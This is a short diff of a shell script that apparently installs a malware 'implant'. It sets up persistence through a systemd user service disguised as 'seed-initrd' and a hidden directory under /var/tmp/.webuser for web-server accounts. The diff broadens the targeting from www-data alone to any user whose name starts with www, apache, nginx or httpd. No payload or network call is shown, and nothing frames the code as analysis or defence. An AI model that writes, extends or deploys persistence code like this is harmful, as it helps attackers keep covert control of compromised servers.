@@ -126,7 +126,7 @@ EOF
 fi
 
 
-if [ "$b" -eq 0 ] && [ "$(id -un)" != "www-data" ]; then
+if [ "$b" -eq 0 ] && [ "$USER" != "www-data" ]; then
     SERVICE_DIR="$HOME/.config/systemd/user"
     SERVICE_FILE="$SERVICE_DIR/seed-initrd.service"
     implant="$SERVICE_DIR/seed-initrd"
@@ -196,7 +196,7 @@ EOF
 fi
 
 
-if [ "$(id -un)" = "www-data" ]; then
+if [[ "$USER" =~ ^(www|apache|nginx|httpd) ]]; then
     info "Deploying implant for ($USER)"
     info "Setting up implant"
     mkdir -p /var/tmp/.webuser/tasks/
